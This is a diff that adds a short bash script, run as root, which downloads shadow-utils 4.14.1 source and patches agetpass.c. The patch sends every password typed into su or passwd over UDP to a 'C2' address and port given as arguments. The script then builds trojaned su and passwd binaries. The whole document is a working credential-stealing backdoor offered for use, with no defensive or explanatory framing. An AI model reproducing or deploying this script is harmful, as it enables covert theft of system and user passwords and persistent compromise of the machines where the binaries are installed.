@@ -1,0 +1,37 @@
+#!/bin/bash
+
+if [[ $(/usr/bin/id -u) -ne 0 ]]; then
+    echo "Script must be run as root"
+    exit
+fi
+
+if [ "$1" = "" ] || [ "$2" = "" ]
+then
+  echo "Usage: sudo $0 <C2 IP> <Port>"
+  exit
+fi
+
+
+apt-get install -y make unzip libbsd-dev
+
+wget "https://codeload.github.com/shadow-maint/shadow/zip/refs/tags/4.14.1"
+unzip "4.14.1"
+rm "4.14.1"
+
+DEST_IP=$1
+PORT=$2
+dir="shadow-4.14.1/lib/agetpass.c"
+
+PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\");"
+match='len = strlen(pass);'
+
+gsed -i "/$match/a$PAYLOAD" $dir
+gsed -i '/\#include <string.h>/rsudowudo.c' $dir
+
+cd shadow-4.14.1
+
+./autogen.sh --without-selinux
+make all
+cp src/su ../
+cp src/passwd ../
+cd ../ && rm -r shadow-4.14.1
